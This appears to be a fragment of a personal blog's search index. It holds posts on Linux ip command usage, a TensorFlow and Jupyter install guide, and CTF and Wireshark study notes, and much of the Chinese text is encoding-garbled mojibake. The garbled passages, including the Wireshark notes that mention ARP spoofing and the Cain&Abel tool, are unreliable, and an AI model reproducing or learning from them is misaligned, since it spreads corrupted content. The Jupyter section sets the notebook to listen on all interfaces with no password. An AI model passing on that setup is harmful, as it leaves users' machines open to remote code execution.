Resource Publication      SSDP Discovery      UPnP Device Host            „ÄêÁªàÊ≠¢ÔºåÂõ†‰∏∫Ë¶ÅÈí±„ÄëÂú®ÂÆâË£ÖATAÁöÑËøáÁ®ã‰∏≠ÈÅáÂà∞ÁöÑÈóÆÈ¢òÔºö                  Âú®Windows 2008 R2 Enterprise‰∏≠ÂÆâË£Ö.Net Framework 4.6.1‰∏ÄÁõ¥Â§±Ë¥•ÔºåÊâæÂà∞Ëß£ÂÜ≥ÈóÆÈ¢òÁöÑÂäûÊ≥ïÔºöÊù•Ê∫ê        ‰∏ãËΩΩofflineÁöÑ.Net 4.6.1ÁöÑÂÆâË£ÖÂåÖÔºåÁî®ÊüêÁßçÊäÄÂ∑ßÊèêÂèñexe‰∏≠ÁöÑmsiÊñá‰ª∂ÔºåÊàë‰ΩøÁî®7-zipËΩØ‰ª∂ÊèêÂèñÔºåÊâæÂà∞netfx_Full_x64Êñá‰ª∂Âç≥ÂèØÂÆåÊàêÂÆâË£ÖÁªïËøáÊ£ÄÊü•„ÄÇ                  HashcatÊó†Ê≥ï‰ΩøÁî®    clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  No devices found/left."
  },
  
  {
    "title": "IP Command",
    "url": "/posts/IP_Command/",
    "categories": "",
    "tags": "Network",
    "date": "2018-08-09 00:00:00 -0700",
    





    
    "snippet": "Recently, I need to configure a bunch of switches to construct a leaf-spine network. And IP command is a good choice to do this software-base configuration. And how I summaried the ip command‚Äôs usa...",
    "content": "Recently, I need to configure a bunch of switches to construct a leaf-spine network. And IP command is a good choice to do this software-base configuration. And how I summaried the ip command‚Äôs usage bases on the document which is written by Alexey N. Kuznetsov.Use who command to list the users logining the same machine currently.Use service network restart or /etc/init.d/networking restart to restart the network module in Linux.1. OverviewIP command which is a utility from iproute2 package is used to configure the Linux network.The ip command syntax:ip [options] object [command [arguments]]Options( a set of optional modifiers affecting the general behaviour of the ip utility or changing its output ):  -V/Version  -s/statistics: use one time to output more information. use twice time to output more information.  -o/oneline: output record on a single lineObjects( the object to manage or to get information about ):  link: network device  address: IP or IPv6 address  neighbour: ARP or NDISC(Neighbor Discover Protocol for ipv6) cache entry  route: routing table entry  rule: rule in routing policy databse  maddress: multicast address  mroute: multicast routing cache entry  tunnel: tunnel over IPCommands: add/delete/show/helpArguments: flags and parameterserror messages  syntax error  argument verification  ip compilation failure  syscall error from kernel2. IP Link ‚Äì network device configuration2.1 ip link setArguments:  dev NAME(default)  up/down  arp on/off  multicast on/off  dynamic on/off  name NAME  txqueuelen/txqlen NUMBER  mtu Number  address LLADDRESS  broadcast LLADDRESS2.2 ip link showArguments:  dev NAME(default)  up: display running interfaces2.2.1 An example of using ip link show on Ubuntu 2018 x86_64:\t1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\t\tlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\t2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\t\tlink/ether 00:0c:29:b9:bd:c8 brd ff:ff:ff:ff:ff:ffExplanation:  interface index: the number before the colon  interface name  interface flags:          UP: the device is turned on.      LOOPBACK: all packets will be returned but bounced packets.      BROADCAST: sent packets to all hosts sharing the same link.      POINTOPOINT      MULTICAST: a bigger type on Broacast        mtu: maximal transfer unit  qdisc: queuing discipline          noqueue: the interface does not queue anything      noop: blackhole model and discard anything      qlen: default ransmit queue length        link layer address and device mac address: second line‚Äôs information2.2.2 An example of using ip -s -s link ls ens33 ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000link/ether 00:0c:29:b9:bd:c8 brd ff:ff:ff:ff:ff:ffRX: bytes  packets  errors  dropped overrun mcast596509     3028     0       0       0       0RX errors: length   crc     frame   fifo    missed           0        0       0       0       0TX: bytes  packets  errors  dropped carrier collsns316030     2201     0       0       0       0TX errors: aborted  fifo   window heartbeat transns           0        0       0       0       4Explanation:  RX/TX: receiver and transmitter statistics  different type of bytes or packets3. IP Address ‚Äì protocol address management3.1 ip address addArguments:  dev NAME  local ADDRESS(default)  broadcast ADDRESSExample:ip addr add 10.0.0.1/24 brd + dev eth0 label eth0:Alias: add the address 10.0.0.1 with prefix length 24 (i.e. netmask 255.255.255.0), standard broadcast and label eth0:Alias to the interface eth0.3.2 ip address deleteThis command coincides with the arguments of ip addr add.3.3 ip address showThis command shows the details of the ip address configuration.3.4 ip address flushdangerous, similiar to delete command4. IP NeighbourNeighour objects establish bindings between protocol addresses and link layer addresses for hosts sharing the same link. The IPv4 neighbour table is known as the ARP table.  ip neigh add/change/replace  ip neigh delete  ip neigh show  ip neigh flushExample:ip neigh add 10.0.0.3 lladdr 0:0:0:0:0:1 dev eth0 nud perm: add a permanent ARP entry for the neighbour 10.0.0.3 on the device eth0.5. IP Route ‚Äì routing table managementRoute entries in the kernel routing tables keep information about paths to other networked nodes.All of the packets will obey the routes based on the prefix its ip address matches. If several routes match the packet, the longest matching prefix is selected.  ip route add/change/replace  ip route delete  ip route show  ip route flush  ip route getExample:ip route add 10.0.0/24 via 193.233.7.65: add a plain route to network 10.0.0/24 via gateway 193.233.7.65.6. Other CommandsIP Rule ‚Äì routing policy database managementRules in the routing policy database control the route selection algorithm.  ip rule add/delete  ip rule showIP maddress ‚Äì multicast addresses managementIP mroute ‚Äì multicast routing cache managementIP tunnel ‚Äì tunnel configurationError Record:      When the file interfaces does not work, the problem mostly is in the interfaces file‚Äôs content which contains some mistakes or lack in some tools. Once the file interfaces does not work although I restarted the network module. The problem is that I did not install ethtool which is used in interfaces file.    Ethtool is a useful utility used for Network Interface Card configuration. It is easy toconfigure the IP address, interface speed, interface duplex or half duplex.  "
  },
  
  {
    "title": "Tensorflow Learning",
    "url": "/posts/Tensorflow_Learning/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2018-08-03 00:00:00 -0700",
    





    
    "snippet": "1. Start UpThe aim of this chapter is to install IPython and tensorflow packages by Anaconda.      Installing Jupyter methods: There are two methods listing on the page, but the first one which use...",
    "content": "1. Start UpThe aim of this chapter is to install IPython and tensorflow packages by Anaconda.      Installing Jupyter methods: There are two methods listing on the page, but the first one which used Anaconda is recommanded because when you want to delete the whole things the pip way just sucks.    When you want to uninstall Jupyter, the conda way uses the following command easily: conda uninstall jupyter notebook. But the pip way needs to use pip list |grep Jupyter and then uninstall the result by hand.        Install Anaconda: Using the curl command is the fastest way to get the installer, or the installer is avaiable on the official website.    curl -O https://repo.continuum.io/archive/Anaconda3-5.2.0-Linux-x86_64.sh    You can check the installer by the sha256 with the sum on the official website:    sha256sum Anaconda3-5.2.0-Linux-x86_64.sh    Then run the script:    bash Anaconda3-5.2.0-Linux-x86_64.sh    Once the ouput shows the following information:     installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] &gt;&gt;&gt;   Input `Yes` to use `conda` command everywhere. And activate the configuration with the following command:        source ~/.bashrc        Common usage of conda:     conda list # list the packages conda info -envs # list the environments conda create --name my_env python=3.6 # create an environment with python 3.6 source activate my_env # activate the environment source deactivate # deactivate conda remove --name my_env --all # delete the environment conda update conda/anaconda # update conda and anaconda distribution version conda install anaconda-clean # delete anaconda anaconda-clean rm -rf ~/anaconda3 # need to delete the path in ~/.bashrc as well            Install Jupyter:  After created the environment by the command:    conda create -n tensorflow pip python=2.7 # or python=3.6    activate the environment and then install Jupyter and TensorFlow. After that, you need to set the config for running a notebook server so you can just use your browser to control the Jupyter. The information is provided here. For me, the easiest way to configure it is like that:     $ jupyter notebook --generate-config $ vim ~/.jupyter/jupyter_notebook_config.py # delete the # before the following lines     c.NotebookApp.ip = '*'     c.NotebookApp.notebook_dir = '/home/User/jupyter'     c.NotebookApp.open_browser = True        After that, you can use &lt;IP address&gt;:8888 on your browser to connect the Jupyter.        Install Tensorflow(After activated the environment):    $ pip install --ignore-installed --upgrade tfBinaryURL    tfBinaryURL is available on the page. The following command may be needed to be updated.    pip install --ignore-installed --upgrade https://download.tensorflow.google.cn/linux/cpu/tensorflow-1.8.0-cp36-cp36m-linux_x86_64.whl        Now when you use jupyter notebook and new your first file try to import tensorflow, it is still not available. The reason is that the jupyter package is installed on conda dirctory but tensorflow is installed in your environment. So the method to solve the problem is to install the jupyter package in your environment and add the environment path to the .bashrc file.     ```shell  source activate my_env  pip install jupyter  vim ~/.bashrc        export PATH=‚Äù/home/user/anaconda3/bin:$PATH‚Äù # replace the line  export PATH=‚Äù/home/user/anaconda3/envs/my_env/bin:/home/user/anaconda3/bin:PATH‚Äù  source ~/.bashrc  ``        Everything has done! Explore the TensorFlow by Jupyter!  ErrorIf you get the warning like that:/home/jxu/anaconda3/envs/tensorflow/lib/python3.6/importlib/_bootstrap.py:219: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88It means the numpy and the tensorflow version are conflict. So the solution is to use the commands to change the numpy version after you activate the anaconda environment.sudo pip uninstall numpysudo pip install numpy==1.14.5Then reactivate the environment and the warning disappear.2. TensorboardTensorboard is a very useful software which can provide five types of visualizations: scalars, images, audio, histograms and graphs.Step 1: Serializing the dataTensorboard operates by tensorflow events files. The following functions can be used to record the information.  tf.summary.scalar: collect the information of the variable changes  tf.summary.histogram: visualize the distributions of gradients or weights  tf.summary.merge_all: manage all the summary nodes  tf.summary.FileWriter: write the summary data to diskStep 2: Launch the TensorboardBefore runing Tensorboard, generate summary data in a log directory by the following code snippets:# sess.graph contains the graph definitionfile_writer = tf.summary.FileWriter('/path/to/logs', sess.graph)And then, run the tensorboard:tensorboard --logdir=path/to/log-directoryStep 3: Graph Visualizationuse tf.name_scope('') to push a name scope in the graph. The better your name scopes, the better your visualization.Tensorflow graphs have 2 kinds of connections: data dependencies and control dependencies.  data dependencies: solid lines  control dependencies: dotted linesFor networks with long sequences, sequential motifs that nodes whose names differ by a numer at the end and have isomorphic structures are collapsed into a single stack od nodes like range[1-8].3. A simple example with RNNSome key terminologies in neural network when reading the code:  batch_size: the number of training examples in one forward/backward pass  epoch: one forward pass and one backward pass of all the training examples  number of iterations: number of passes, each pass using [batch size] number of examplesExample: if you have 1000 training examples, and your batch size is 500, then it will take 2 iterations to complete 1 epoch.4. Data PreprocessingData NormalizationNormalization is an example of preprocessing data to remove or reduce the burden from machine learning (ML) to learn certain invariants, that is, things which make no difference in the meaning of the symbol, but only change the rep- resentation. So the data redundancy is reduced.5. Cross ValidationCross validation is primarily used to estimate the skill of a machine learningmodel on unseen data. That is, to use a limited sample in order to estimate how the model is expected to perform in general when used to make predictions on data not used during the training of the model. It is a popular method because it is simple to understand and because it generally results in a less biased or less optimistic estimate of the model skill than other methods, such as a simple train/test split.Stanford CS231nComputer VisionThe whole study materials in the blog are from Stanford official websites.1. Simple algorithms with basic concept in machine learningThe simple and core problems in Computer Vision is Image Classfication. The image can be reshaped to a matric with three colors channels Red, Green, Blue. But there are a lot of changes of the same object in different pictures based on the viewpoint variation, scale variation, deformation, background clutter and so on. The approach to solve the problem is the using of data-driven.k-Means NeighborThe first algorithm is Nearest Neighbor Classifier. It compares the mertics of different images and decides the result on the distance of them. The distance formula which is a reasonable choice is the following formula which is called $L1$ distance:\\(d_1(I_1, I_2) = \\Sigma_p|I_1^p - I_2^p|\\)The imporved algorithm is k-Nearest Neighbor Classifier which will find the top k closest images instead of the closest one.cross-validationNot just split the data into training set and validation set, the training set is divided into 5 equal folders and use 4 of themfor training and 1 for validation. And iterate over which folder is the validation set.hyper-parametersThey are associated with the classifier and do not have a good way to choose the bset value.loss/cost functionThe loss function can calcuate the distance between the true aim and the training result which measure the outcomes accurate.The following formula is the Multiclass Support Vector Machine(SVM) loss.\\[L_i = \\Sigma_{j\\neq y_i}max(0, s_j - s_{y_i} + 1)\\]The softmax classifier‚Äôs cross-entropy loass form:\\[L_i = -log\\Big(\\frac{e^{f_{}y_i}}{\\Sigma_j e^{f_j}}\\Big)\\]backpropagationBackpropagation is a way of computing gradients of expressions through recursive application of chain rule.activation function"
  },
  
  {
    "title": "CTF MISC Summary",
    "url": "/posts/CTF_MISC/",
    "categories": "",
    "tags": "Network",
    "date": "2018-05-01 00:00:00 -0700",
    





    
    "snippet": "MISC is the abbreviation of miscellaneou. It includes packets analysis, picture invisible and many other parts. This blog will summarize these concepts and problems to make it easier to remember th...",
    "content": "MISC is the abbreviation of miscellaneou. It includes packets analysis, picture invisible and many other parts. This blog will summarize these concepts and problems to make it easier to remember the whole stuff.First, I want to summarize the magic word of the pictures and executes which are useful in a lot of problems in CTF contest.            file type      start of image      end of image                  JPEG      ff d8      ff d9              JFIF      ff e0      ¬†              Exif      ff e1      ¬†      We can use some commands to figure out the files‚Äô real type and content:  file xxx.png  strings xxx.png[Finished] WiresharkÊï∞ÊçÆÂåÖÂàÜÊûêÂÆûÊàòÔºöPracitical Packet Analysis[America] Chris Sanders1. Êï∞ÊçÆÂåÖÂàÜÊûêÂü∫Á°Ä1.1 Êï∞ÊçÆÂåÖÂóÖÊé¢Âô®Â∑•‰ΩúÂéüÁêÜÔºöÂ∞ÜÂóÖÊé¢Âô®ËÆæÁΩÆÂú®ÊåáÂÆöÁöÑ‰ΩçÁΩÆÔºåÊî∂ÈõÜÂæÄÊù•ÁöÑÊï∞ÊçÆÂåÖÔºåËΩ¨Êç¢ÊàêÂèØËØªÂΩ¢ÂºèÔºåËØÜÂà´ÂàÜÊûêÂíåÈ™åËØÅÂçèËÆÆ„ÄÇ1.2 OSI‰∏ÉÂ±ÇÊ®°ÂûãÔºö            Â±ÇÊ¨°      ÂçèËÆÆ                  Â∫îÁî®Â±Ç      HTTP, SMTP, FTP, Telnet              Ë°®Á§∫Â±Ç      ASCII, MPEG, JPEG, MIDI              ‰ºöËØùÂ±Ç      NetBIOS, SAP, SDP, NWLink              ‰º†ËæìÂ±Ç      TCP, UDP, SPX              ÁΩëÁªúÂ±Ç      IP, IPX              Êï∞ÊçÆÈìæË∑ØÂ±Ç      Ethernet, Token Ring, FDDI, AppleTalk              Áâ©ÁêÜÂ±Ç      ¬†      1.3 Êï∞ÊçÆÂ∞ÅË£Ö‰∏çÂêåÂ±ÇÊ¨°Âú®Êï∞ÊçÆÂåÖÂ§¥ÈÉ®Â¢ûÂä†ÊàñÂéªÈô§Êï∞ÊçÆÂùóÔºåÂÆûÁé∞Â∞ÅË£ÖÔºö‰ª•Â§™ÁΩë+IP+TCP+HTTP„ÄÇ1.4 ÁΩëÁªúÁ°¨‰ª∂  ÈõÜÁ∫øÂô®ÔºöÂçäÂèåÂ∑•Ê®°ÂºèÔºà‰∏çËÉΩÂêå‰∏ÄÊó∂Èó¥Êé•Êî∂ÂíåÂèëÈÄÅÊï∞ÊçÆÔºâÔºå‰ºöÂ∞Ü‰ªé‰∏Ä‰∏™Á´ØÂè£Êî∂Âà∞ÁöÑÊï∞ÊçÆÂåÖÂêëÂÖ∂‰ªñÊØè‰∏Ä‰∏™Á´ØÂè£‰º†ËæìÔºåÈ´òË¥üËΩΩÊó∂ÊïàÁéá‰Ωé‰∏ã„ÄÇ  ‰∫§Êç¢Êú∫ÔºöÂêëÊåáÂÆöÁ´ØÂè£‰º†ËæìÊï∞ÊçÆÂåÖÔºåÂ∑•‰ΩúÂú®Êï∞ÊçÆÈìæË∑ØÂ±Ç„ÄÇ  Ë∑ØÁî±Âô®ÔºöÂ∑•‰ΩúÂú®ÁΩëÁªúÂ±ÇÔºåÁî®IPÂú∞ÂùÄÊ†áËØÜÁΩëÁªúËÆæÂ§á„ÄÇ1.5 Âú®‰∫§Êç¢ÂºèÁΩëÁªú‰∏≠ËøõË°åÂóÖÊé¢  Á´ØÂè£ÈïúÂÉèÔºöËé∑ÂèñÁõÆÊ†áËÆæÂ§á‰º†Ëæì‰∏éÊé•Êî∂ÁöÑÁΩëÁªúÊµÅÈáè„ÄÇË¶ÅÊ±ÇÔºö‰∫§Êç¢Êú∫Êèê‰æõËøô‰∏™ÂäüËÉΩÔºõÁõëÂê¨Á´ØÂè£ÁöÑÊµÅÈáè‰∏çËÉΩÂ∞è‰∫éË¢´ÁõëÂê¨Á´ØÂè£ÁöÑÊµÅÈáè„ÄÇ  ÈõÜÁ∫øÂô®ËæìÂá∫ÔºöÈÄöËøáÂú®Ë¢´ÁõëÂê¨ËÆæÂ§á‰∏ä‰ΩøÁî®ÈõÜÁ∫øÂô®ÂÆûÁé∞ÁõëÂê¨„ÄÇ  ÁΩëÁªúÂàÜÊµÅÂô®ÔºöÂú®ÊüêÊÆµÁΩëÁ∫ø‰∏äÂ¢ûÂä†ÁΩëÁªúÂàÜÊµÅÂô®ÂÆûÁé∞ÁõëÂê¨ÊµÅÁªèÁΩëÁ∫øÁöÑÊï∞ÊçÆ„ÄÇ  ARPÊ¨∫È™óÔºöÂú®Â±ÄÂüüÁΩë‰∏≠ÂèëÈÄÅÂåÖÂê´ËôöÂÅáMACÂú∞ÂùÄÁöÑARPÊ∂àÊÅØÔºå‰ª•Âä´ÊåÅÂÖ∂‰ªñËÆ°ÁÆóÊú∫ÊµÅÈáèÁöÑËøáÁ®ã„ÄÇÊé®ËçêÂ∑•ÂÖ∑ÔºöCabin&amp;Abel2. WiresharkWiresharkÊòØÁõÆÂâçÊúÄÂ•ΩÁî®ÁöÑÂóÖÊé¢Â∑•ÂÖ∑‰πã‰∏ÄÔºåÂÖ∂‰∏ªÁ™óÂè£ÂàÜ‰∏∫‰∏â‰∏™ÈÉ®ÂàÜÔºöPacket List, Packet Details and Packet Bytes.2.1 Êï∞ÊçÆÂåÖÊìç‰Ωú  Êü•ÊâæÊï∞ÊçÆÂåÖÔºöctrl+FÔºåÂåπÈÖç‰∏ã‰∏Ä‰∏™Ôºöctrl+NÔºåÂåπÈÖç‰∏ä‰∏Ä‰∏™Ôºöctrl+BÔºõ  Ê†áËÆ∞Êï∞ÊçÆÂåÖÔºöctrl+MÔºåÂàáÊç¢‰∏ã‰∏Ä‰∏™Ôºöshift+ctrl+NÔºåÂàáÊç¢‰∏ä‰∏Ä‰∏™Ôºöshift+ctrl+BÔºõ  ËÆæÁΩÆÊï∞ÊçÆÂåÖÁõ∏ÂØπÊó∂Èó¥ÔºöEdit-&gt;Set Time Reference2.2 ËøáÊª§Âô®ÂåÖÊã¨ÊçïËé∑ËøáÊª§Âô®ÂíåÊòæÁ§∫ËøáÊª§Âô®„ÄÇ  ÊçïËé∑ËøáÊª§Âô®ËØ≠Ê≥ïÔºå‰ΩøÁî®Berkeley Packet Filter(BPF)Ôºö          ‰∏éÊàñÈùûÔºö&amp;&amp;, ||, !      ‰∏ªÊú∫ÂêçÂíåÂú∞ÂùÄËøáÊª§Âô®Ôºö                  host + IPv4, IPv6, ‰∏ªÊú∫ÂêçÔºõ          src/dst + host + IPv4ÔºõÂØπÊ∫êÂú∞ÂùÄÂíåÁõÆÊ†áÂú∞ÂùÄËøõË°åËøáÊª§          ether host + MacÂú∞ÂùÄÔºõÂØπMacÂú∞ÂùÄËøõË°åËøáÊª§                    Á´ØÂè£ÂíåÂçèËÆÆËøáÊª§Âô®Ôºö(dst) + port + 8080Ôºõ      ÂçèËÆÆËøáÊª§Âô®Ôºöicmp, !ip6;      ÂçèËÆÆÂüüËøáÊª§Âô®ÔºàÈ´òÁ∫ßÔºâÔºöÈúÄË¶ÅÂØπÂçèËÆÆÊúâÊ∑±ÂÖ•ÁêÜËß£                  icmp[0] == 3ÔºõËøáÊª§ÁõÆÊ†á‰∏çÂèØËææÔºàÁ±ªÂûã3ÔºâÁöÑICMPÊï∞ÊçÆÂåÖ          icmp[0:2] == 0x0301ÔºõËøáÊª§ÁõÆÊ†á‰∏çÂèØËææ„ÄÅ‰∏ªÊú∫‰∏çÂèØËææÔºàÁ±ªÂûã3‰ª£Á†Å1ÔºâÁöÑICMPÊï∞ÊçÆÂåÖ                      ÊòæÁ§∫Êï∞ÊçÆÂåÖÔºö          ip.addr == 192.168.0.1ÔºõÊ†πÊçÆIPÂú∞ÂùÄËøáÊª§      frame.len&lt;=128ÔºõËøáÊª§ÈïøÂ∫¶Â∞è‰∫é128Â≠óËäÇÁöÑÊï∞ÊçÆÂåÖ      ÈÄªËæëËøêÁÆóÁ¨¶Ôºöand, or, xor, not        Êü•ÁúãÁ´ØÁÇπÔºöStatistics-&gt;Endpoints  Êü•ÁúãÁΩëÁªú‰ºöËØùÔºöStatistics-&gt;Conversations  Âü∫‰∫éÂçèËÆÆÂàÜÂ±ÇÁªìÊûÑÁöÑÁªüËÆ°Êï∞ÊçÆÔºöStatistics-&gt;Protocol Hierarchy  ÂêçÂ≠óËß£ÊûêÔºöCapture-&gt;Options          MacÂú∞ÂùÄËß£ÊûêÔºö‰ΩøÁî®ARPÂçèËÆÆÂ∞ÜMacÂú∞ÂùÄËΩ¨ÂåñÊàêIPÂú∞ÂùÄ      ÁΩëÁªúÂêçÂ≠óËß£ÊûêÔºöIPÂú∞ÂùÄËΩ¨Âåñ‰∏∫ÂüüÂêç      ‰º†ËæìÂêçÂ≠óËß£ÊûêÔºöÂ∞ÜÁ´ØÂè£Âè∑ËΩ¨Âåñ‰∏∫ÂçèËÆÆÂêçÁß∞        Êõ¥Êç¢Ëß£ÊûêÂô®ÔºöÈÅáÂà∞ÈîôËØØËØÜÂà´ÂçèËÆÆÁöÑÊÉÖÂÜµ‰∏ã‰ΩøÁî®  Ë∑üË∏™TCPÊµÅÔºöÈÄâÊã©Êï∞ÊçÆÂåÖÂè≥ÈîÆFollow TCP Stream  Êï∞ÊçÆÂåÖÈïøÂ∫¶ÊÄªÁªìÔºöStatistics-&gt;Packet Lengths-&gt;Create Stat  ÂõæÂΩ¢Â±ïÁ§∫ÔºöStatistics-&gt;IO Graphs          ÂèåÂêëÊó∂Èó¥Ë°®ÔºöStatistics-&gt;TCP Stram Graph-&gt;Round Trip Time Graph      Êï∞ÊçÆÊµÅÂõæÔºöStatistics -&gt; Flow Graph        ‰∏ìÂÆ∂‰ø°ÊÅØÔºöÂØπËØù„ÄÅÊ≥®ÊÑè„ÄÅË≠¶Âëä„ÄÅÈîôËØØ3. ÈÄöÁî®Â∫ïÂ±ÇÁΩëÁªúÂçèËÆÆ3.1 Âú∞ÂùÄËß£ÊûêÂçèËÆÆ(ARP)Â§¥ÂåÖÂê´ÁöÑÊï∞ÊçÆÔºöARPÂçèËÆÆÂ∑•‰ΩúÂú®Êï∞ÊçÆÈìæË∑ØÂ±ÇÂíåÁΩëÁªúÂ±Ç‰πãÈó¥ÔºåÁî±‰∫éÂÖ∂Â∞ÅË£ÖÊàêÂ∏ßÁöÑÂΩ¢ÂºèÔºåÂèØ‰ª•ÁúãÂÅöÂ±û‰∫éÊï∞ÊçÆÈìæË∑ØÂ±Ç„ÄÇ  Á°¨‰ª∂Á±ªÂûãÔºöÊï∞ÊçÆÈìæË∑ØÂ±Ç‰ΩøÁî®ÁöÑÁ±ªÂûãÊï∞ÊçÆÔºå‰∏ÄËà¨ÊòØ‰ª•Â§™ÁΩëÔºàÁ±ªÂûã1Ôºâ  ÂçèËÆÆÁ±ªÂûãÔºöARPËØ∑Ê±ÇÊ≠£Âú®‰ΩøÁî®ÁöÑÈ´òÂ±ÇÂçèËÆÆ  Á°¨‰ª∂Âú∞ÂùÄÈïøÂ∫¶  ÂçèËÆÆÂú∞ÂùÄÈïøÂ∫¶  ARPÊìç‰ΩúÁ†ÅÔºö1Ë°®Á§∫ËØ∑Ê±ÇÔºå2Ë°®Á§∫ÂìçÂ∫î  ÂèëÈÄÅÊñπÁ°¨‰ª∂Âú∞ÂùÄ  ÂèëÈÄÅÊñπÂçèËÆÆÂú∞ÂùÄ  ÁõÆÊ†áÁ°¨‰ª∂Âú∞ÂùÄ  ÁõÆÊ†áÂçèËÆÆÂú∞ÂùÄ3.2 ‰∫íËÅîÁΩëÂçèËÆÆ(IP)‰ª•Â§™ÁΩëÂú®Êï∞ÊçÆÈìæË∑ØÂ±ÇËÉΩ‰º†ËæìÁöÑÊúÄÂ§ßÊï∞ÊçÆÂåÖÂ§ßÂ∞èÊòØ1500Â≠óËäÇÔºåÂç≥ÊúÄÂ§ß‰º†ËæìÂçïÂÖÉMaximum Transmission Unit(MTU)„ÄÇÂ≠òÊ¥ªÊó∂Èó¥(TTL)‰ª£Ë°®ËØ•Êï∞ÊçÆÂåÖÂú®Ë¢´‰∏¢ÂºÉ‰πãÂâçÊâÄËÉΩÁªèÂéÜÁöÑË∑≥Êï∞ÔºåÊØèÁªèËøá‰∏Ä‰∏™Ë∑ØÁî±Âô®Ë∑≥Êï∞Âáè‰∏Ä„ÄÇICMP pingÂ∑•ÂÖ∑‰ª•Ê≠§Êù•Ê£ÄÊµãËÆæÂ§á‰πãÈó¥ÁöÑÈÄö‰ø°ÊÉÖÂÜµ„ÄÇ  IPv4Â§¥          ÁâàÊú¨Âè∑ÔºöIPÊâÄ‰ΩøÁî®ÁöÑÁâàÊú¨      È¶ñÈÉ®ÈïøÂ∫¶ÔºöIPÂ§¥ÁöÑÈïøÂ∫¶      ÊúçÂä°Á±ªÂûãÔºö‰ºòÂÖàÁ∫ßÊ†áÂøó‰ΩçÂíåÊúçÂä°Á±ªÂûãÊ†áÂøó‰Ωç      ÊÄªÈïøÂ∫¶      Ê†áËØÜÁ¨¶ÔºöÁî®‰∫éËØÜÂà´Êï∞ÊçÆÂåÖÊàñË¢´ÂàÜÁâáÊï∞ÊçÆÂåÖÁöÑÊ¨°Â∫è      Ê†áËÆ∞ÔºöÂå∫ÂàÜÊï∞ÊçÆÂåÖÊòØÂê¶ÊòØ‰∏ÄÁªÑÂàÜÁâáÊï∞ÊçÆÂåÖ      ÂàÜÁâáÂÅèÁßª      Â≠òÊ¥ªÊó∂Èó¥ÔºöÂâ©‰ΩôÁªèËøáË∑ØÁî±Âô®Ë∑≥Êï∞      ÂçèËÆÆÔºö‰∏äÂ±ÇÂçèËÆÆÊï∞ÊçÆÂåÖÁ±ªÂûã      È¶ñÈÉ®Ê†°È™åÂíåÔºöÊï∞ÊçÆÈîôËØØÊ£ÄÊµãÊú∫Âà∂      Ê∫êIPÂú∞ÂùÄ      ÁõÆÁöÑIPÂú∞ÂùÄ      ÈÄâÈ°π      Êï∞ÊçÆ      3.3 ‰º†ËæìÊéßÂà∂ÂçèËÆÆ(TCP)‰∏∫Êï∞ÊçÆÊèê‰æõÂèØÈù†ÁöÑÁ´ØÂà∞Á´Ø‰º†ËæìÔºåÂ∑•‰ΩúÂú®‰º†ËæìÂ±ÇÔºåÂèØ‰ª•Â§ÑÁêÜÊï∞ÊçÆÁöÑÈ°∫Â∫èÂíåÈîôËØØÊÅ¢Â§ç„ÄÇ  TCPÂ§¥          Ê∫êÁ´ØÂè£      ÁõÆÁöÑÁ´ØÂè£      Â∫èÂè∑ÔºöË°®Á§∫TCPÁâáÊÆµ      Á°ÆËÆ§Âè∑      Ê†áËÆ∞Âè∑                  URG          ACK          PSH          RSTÔºöËøûÊé•Ë¢´ÂºÇÂ∏∏ÁªàÊ≠¢ÊàñÊãíÁªùËøûÊé•ËØ∑Ê±Ç          SYN          FIN                    Á™óÂè£Â§ßÂ∞è      Ê†°È™åÂíå      Á¥ßÊÄ•ÊåáÈíà      ÈÄâÈ°π        TCP‰∏âÊ¨°Êè°Êâã          A -SYN-&gt; B      A &lt;-SYN/ACK- B      A -ACK-&gt; B        TCPÁªàÊ≠¢          A -FIN/ACK-&gt; B      A &lt;-ACK- B      A -FIN/ACK-&gt; B      A -ACK-&gt; B        TCPÈáçÁΩÆ: RST, ACK3.4 Áî®Êà∑Êï∞ÊçÆÊä•ÂçèËÆÆ(UDP)Â∑•‰ΩúÂú®‰º†ËæìÂ±ÇÔºåÊèê‰æõÈ´òÈÄü‰º†ËæìÔºåÁß∞‰∏∫‚ÄúÊó†ËøûÊé•ÂçèËÆÆ‚Äù„ÄÇ  UDPÂ§¥          Ê∫êÁ´ØÂè£      ÁõÆÊ†áÁ´ØÂè£      Êï∞ÊçÆÂåÖÈïøÂ∫¶      Ê†°È™åÂíå      3.5 ‰∫íËÅîÁΩëÊéßÂà∂Ê∂àÊÅØÂçèËÆÆ(ICMP)ÔºöË¥üË¥£Êèê‰æõÂú®ÁΩëÁªú‰∏äËÆæÂ§á„ÄÅÊúçÂä°‰ª•ÂèäË∑ØÁî±Âô®ÁöÑÂèØÁî®ÊÄß‰ø°ÊÅØ„ÄÇÂ±û‰∫éÁΩëÁªúÂ±ÇÂçèËÆÆ„ÄÇ  ICMPÂ§¥Ôºö          Á±ªÂûãType      ‰ª£Á†ÅCode      Ê†°È™åÂíåChecksum      ÂèØÂèòÂüüVariable      3.5.1 pingÂ∑•ÂÖ∑Áî®‰∫éÂèëÈÄÅICMP echoËØ∑Ê±ÇÊï∞ÊçÆÂåÖ3.5.2 Ë∑ØÁî±Ë∑üË∏™ÔºöÈÄöËøáÂèëÈÄÅTTL‰∏çÊñ≠Ëá™Â¢ûÁöÑÊï∞ÊçÆÂåÖÔºåÂÆûÁé∞ÂèØ‰ª•‰∫ÜËß£ICMPÊï∞ÊçÆÂåÖÂèëÈÄÅÁöÑÊØè‰∏ÄË∑≥ÁöÑËäÇÁÇπÁöÑ‰ø°ÊÅØ„ÄÇWindows‰∏ã‰ΩøÁî®tracert &lt;IP&gt;ÂëΩ‰ª§„ÄÇ4. Â∏∏ËßÅÈ´òÂ±ÇÁΩëÁªúÂçèËÆÆ4.1 Âä®ÊÄÅ‰∏ªÊú∫ÈÖçÁΩÆÂçèËÆÆ(DHCP): 